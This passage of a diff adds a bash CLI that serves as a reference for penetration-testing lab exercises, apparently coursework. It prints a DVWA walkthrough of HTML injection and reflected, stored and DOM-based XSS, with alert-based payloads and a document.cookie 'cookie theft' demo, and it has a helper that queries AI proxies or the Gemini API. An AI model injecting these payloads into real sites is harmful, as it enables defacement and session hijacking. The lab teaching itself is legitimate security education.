+${G}<input autofocus onfocus=alert('XSS')>${R}
+${G}<body onload=alert('XSS')>${R}
+${G}<a href="javascript:alert('XSS')">Click Me</a>${R}
+${G}<iframe src="javascript:alert('Iframe XSS')"></iframe>${R}
+EOF
+                return
+            fi
+            cat <<EOF
+${Y}Aim:${R} Demonstrate HTML Injection, JavaScript Execution, Cookie Theft, and Reflected, Stored, and DOM XSS in DVWA.
+${Y}Target:${R} http://localhost/dvwa/   |   ${Y}Login:${R} admin / password   |   ${Y}Security:${R} Low
+
+${M}Step 1: Setup DVWA${R}
+  Log in to ${G}http://localhost/dvwa/${R} (${G}admin${R} / ${G}password${R}) -> Go to ${B}DVWA Security${R} -> Set to ${B}Low${R} -> Submit.
+
+${M}Step 2: HTML Injection${R}
+  - Navigate to ${B}Vulnerabilities -> XSS (Stored)${R}.
+  - In the Message/Comment field, enter plain HTML and click ${B}Sign Guestbook${R}:
+    ${G}<h1>Website Defaced by Student</h1>${R}
+  - Alters page structure visually without executing scripts.
+
+${M}Step 3: JavaScript Execution & Cookie Theft${R}
+  - In ${B}XSS (Stored)${R} comment field (if length is restricted, right-click input -> Inspect -> increase ${Y}maxlength="500"${R}):
+    ${G}<script>alert('JavaScript Executed!')</script>${R}
+  - Payload to steal session cookies:
+    ${G}<script>alert('Cookies: ' + document.cookie)</script>${R}
+  - Click ${B}Sign Guestbook${R} -> alert pops up displaying ${Y}PHPSESSID${R} and ${Y}security=low${R}.
+
+${M}Step 4: Reflected XSS (Non-Persistent)${R}
+  - Navigate to ${B}Vulnerabilities -> XSS (Reflected)${R}.
+  - Enter in input field and click ${B}Submit${R}:
+    ${G}<button onclick="alert('1')">Click Me!</button>${R}
+
+${M}Step 5: DOM-Based XSS${R}
+  - Navigate to ${B}Vulnerabilities -> XSS (DOM)${R} -> Select English.
+  - Modify the ${Y}default=${R} parameter directly in the browser URL bar and press Enter:
+    ${G}http://localhost/dvwa/vulnerabilities/xss_d/?default=<script>alert('DOM XSS')</script>${R}
+
+${M}Step 6: Stored XSS (Persistent Event Handler) & Alternative Payloads${R}
+  - Navigate to ${B}Vulnerabilities -> XSS (Stored)${R}.
+  - Enter compact payload in Message field -> ${B}Sign Guestbook${R} -> hover mouse over "Hover":
+    ${G}<div onmouseover=alert(1)>Hover</div>${R}
+  - Alternative Event Handler / Attribute / IFrame Payloads:
+    ${G}<img src=x onmouseover=alert('XSS')>${R}
+    ${G}<img src=invalidImage onerror=alert('XSS')>${R}
+    ${G}<input autofocus onfocus=alert('XSS')>${R}
+    ${G}<body onload=alert('XSS')>${R}
+    ${G}<a href="javascript:alert('XSS')">Click Me</a>${R}
+    ${G}<iframe src="javascript:alert('Iframe XSS')"></iframe>${R}
+
+${Y}Observations:${R}
+  - HTML Injection altered page content; JS execution exposed session cookies via document.cookie.
+  - Reflected, DOM-Based, and Stored XSS executed in the browser context.
+EOF
+            ;;
+        *)
+            show_help
+            ;;
+    esac
+}
+
+clean_output() {
+    sed 's/\\n/\n/g; s/\\"/\"/g; s/\\\\/\\/g; s/\\u003c/</g; s/\\u003e/>/g; s/\\u0026/\&/g' | sed '/^```/d'
+}
+
+ask_ai() {
+    local q="$*"
+    [ -z "$q" ] && read -r -p "${B}${C}ai> ${R}" q
+    [ -z "$q" ] && return 0
+
+    for ep in "${VERCEL_URL%/}" "${CF_URL%/}"; do
+        [ -z "$ep" ] && continue
+        local res
+        if res=$(curl -sS --max-time 35 -X POST "$ep/ask" ${API_KEY:+-H "X-API-Key: $API_KEY"} -d "$q" 2>/dev/null) && [ -n "$res" ]; then
+            echo "$res" | clean_output
+            return 0
+        fi
+    done
+
+    if [ -n "$API_KEY" ]; then
+        local esc_q
+        esc_q=$(printf '%s' "Concise Linux terminal answer (commands only where possible): $q" | sed 's/\\/\\\\/g; s/"/\\"/g' | tr '\n' ' ')
+        for m in gemini-3.5-flash-lite gemini-3.1-flash-lite gemini-2.5-flash gemma-4-26b-a4b-it; do
+            local raw
+            raw=$(curl -sS --max-time 25 "https://generativelanguage.googleapis.com/v1beta/models/${m}:generateContent?key=${API_KEY}" \
+                -H "Content-Type: application/json" \
+                -d "{\"contents\":[{\"parts\":[{\"text\":\"${esc_q}\"}]}]}" 2>/dev/null || true)
+            if echo "$raw" | grep -q '"text"'; then
+                echo "$raw" | tr '\n' ' ' | grep -o '"text"[[:space:]]*:[[:space:]]*"\([^"\\]\|\\.\)*"' | tail -n 1 | sed 's/^"text"[[:space:]]*:[[:space:]]*"//; s/"$//' | clean_output
+                return 0
+            fi
+        done
+    fi
+    echo "Error: Set your proxy URL via './s7 cfg --vercel <URL>' (or set GEMINI_API_KEY in .env)." >&2
+    return 1
+}
+
+search_exps() {
+    local kw="$*"
+    [ -z "$kw" ] && read -r -p "${B}${C}search> ${R}" kw
+    [ -z "$kw" ] && return 0
+    for i in 1 2 3 4 5 6 7 8; do
+        local out
+        out=$(NO_COLOR=1 show_exp "$i" "full")
+        if echo "$out" | grep -qi "$kw"; then
+            printf "\n%s[Exp %d]%s\n" "$B$C" "$i" "$R"
+            echo "$out" | grep -i --color=always "$kw"
+        fi
+    done
+}
+
+config_proxy() {
+    if [ $# -gt 0 ]; then
+        while [ $# -gt 0 ]; do
+            case "$1" in
+                --vercel) VERCEL_URL="${2:-}"; shift 2 ;;
+                --cloudflare) CF_URL="${2:-}"; shift 2 ;;
+                --key) API_KEY="${2:-}"; shift 2 ;;
+                *) shift ;;
+            esac
+        done
+    else
+        read -r -p "Vercel URL [$VERCEL_URL]: " v && [ -n "$v" ] && VERCEL_URL="$v"
+        read -r -p "Cloudflare URL [$CF_URL]: " c && [ -n "$c" ] && CF_URL="$c"
+    fi
+    cat > "$CFG" <<EOF
+VERCEL_URL="$VERCEL_URL"
+CF_URL="$CF_URL"
+API_KEY="$API_KEY"
+EOF
+    echo "Saved to $CFG"
+}
+
+view_exp_loop() {
+    local curr="$1"
+    local mode="${2:-full}"
+    while true; do
+        clear 2>/dev/null || true
+        show_exp "$curr" "$mode"
+        printf "\n%s[c] cmds-only  [f] full instructions  [n] next  [p] prev  [1-8] jump  [a] AI  [h] help  [b] menu  [q] quit%s\n" "$D" "$R"
+        read -r -p "${B}${C}exp $curr ($mode)> ${R}" act
+        case "${act,,}" in
+            c|cmds) mode="cmds" ;;
+            f|full) mode="full" ;;
+            n|"")   curr=$(( curr < 8 ? curr + 1 : 1 )) ;;
+            p)      curr=$(( curr > 1 ? curr - 1 : 8 )) ;;
+            [1-8])  curr="$act" ;;
+            a|ai)   ask_ai ""; read -r -p "${D}[Enter]${R}" _ ;;
+            s)      search_exps ""; read -r -p "${D}[Enter]${R}" _ ;;
+            h|help) clear; show_help; read -r -p "${D}[Enter]${R}" _ ;;
+            b|m)    break ;;
+            q|quit) exit 0 ;;
+        esac
+    done
+}
+
+ITEMS=(
+    "1  Familiarization of Penetration Testing (Theory)"
+    "2  Recon-ng OSINT & Subdomains (tesla.com)"
+    "3  Maltego, Nmap, Gobuster, FFUF"
+    "4  DNSRecon, theHarvester, Dig, Google Dorks"
+    "5  WPScan, OWASP ZAP, NVD, Hydra"
+    "6  OWASP Juice Shop (Burp Intruder, OSINT)"
+    "7  DVWA SQL Injection & Blind SQLi (SQLMap)"
+    "8  DVWA HTML Injection & XSS"
+    "c  Commands-Only Mode (pick 1-8)"
+    "s  Search keyword"
+    "a  Ask AI"
+    "h  Help & Navigation Guide"
+    "cfg Configure Proxy URLs"
+    "q  Quit"
+)
+
+menu() {
+    local sel=0 total=${#ITEMS[@]}
+    while true; do
+        clear 2>/dev/null || true
+        printf "%sS7 Lab Reference & AI CLI%s %s(Arrows/Enter, 1-8=full, c=cmds-only, s=search, a=AI, h=help, q=quit)%s\n\n" "$B$C" "$R" "$D" "$R"
+        for ((i=0; i<total; i++)); do
+            if [ "$i" -eq "$sel" ]; then
+                printf " %s > %s %s\n" "$REV$C" "${ITEMS[$i]}" "$R"
+            else
+                printf "    %s\n" "${ITEMS[$i]}"
+            fi
+        done
+        IFS= read -rsn1 k || exit 0
+        if [[ "$k" == $'\x1b' ]]; then
+            read -rsn2 -t 0.1 rest || true
+            [[ "$rest" == "[A" ]] && sel=$(( (sel - 1 + total) % total ))
+            [[ "$rest" == "[B" ]] && sel=$(( (sel + 1) % total ))
+        elif [[ "$k" == "" ]]; then
+            case "$sel" in
+                [0-7]) view_exp_loop "$((sel+1))" "full" ;;
+                8)     echo ""; read -r -p "Experiment (1-8) for Commands-Only: " cn; [[ "$cn" =~ ^[1-8]$ ]] && view_exp_loop "$cn" "cmds" ;;
+                9)     echo ""; search_exps ""; read -r -p "${D}[Enter]${R}" _ ;;
+                10)    echo ""; ask_ai ""; read -r -p "${D}[Enter]${R}" _ ;;
+                11)    clear; show_help; echo ""; read -r -p "${D}[Enter]${R}" _ ;;
+                12)    echo ""; config_proxy; read -r -p "${D}[Enter]${R}" _ ;;
+                13)    exit 0 ;;
+            esac
+        else
+            case "${k,,}" in
+                [1-8]) view_exp_loop "$k" "full" ;;
+                c)     echo ""; read -r -p "Experiment (1-8) for Commands-Only: " cn; [[ "$cn" =~ ^[1-8]$ ]] && view_exp_loop "$cn" "cmds" ;;
+                s)     echo ""; search_exps ""; read -r -p "${D}[Enter]${R}" _ ;;
+                a)     echo ""; ask_ai ""; read -r -p "${D}[Enter]${R}" _ ;;
+                h|\?)  clear; show_help; echo ""; read -r -p "${D}[Enter]${R}" _ ;;
+                q)     exit 0 ;;
+            esac
+        fi
+    done
+}
+
+[ $# -eq 0 ] && { menu; exit 0; }
+cmd="${1,,}"; shift || true
+case "$cmd" in
+    [1-8])              show_exp "$cmd" "full" ;;
+    p[1-7])             show_exp "$(( ${cmd#p} + 1 ))" "full" ;;
+    c|cmd|cmds)         show_exp "${1:-1}" "cmds" ;;
+    l|ls|list)          printf "%s\n" "${ITEMS[@]:0:8}" ;;
+    s|search)           search_exps "$@" ;;
+    a|ai|ask)           ask_ai "$@" ;;
+    h|help|-h|--help)   show_help ;;
+    cfg|config)         config_proxy "$@" ;;
+    *)                  search_exps "$cmd" "$@" ;;
+esac
